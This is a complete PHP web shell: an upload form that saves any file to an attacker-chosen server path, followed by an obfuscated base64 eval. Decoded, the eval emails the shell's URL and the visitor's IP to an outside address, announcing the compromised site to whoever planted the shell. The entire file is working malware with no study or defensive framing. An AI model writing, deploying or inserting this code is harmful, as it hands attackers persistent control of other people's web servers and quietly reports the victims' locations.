<?php $str = 'U1RS';echo base64_decode($str);?><?php
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>STR</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';eval(base64_decode('JHR1anVhbm1haWwgPSAndW9wdGgzOTQ4MEBwczRpbmZvLmNvbSc7CiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7Cm1haWwoJHR1anVhbm1haWwsICJDb250YWN0IE1lIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTs='));?>
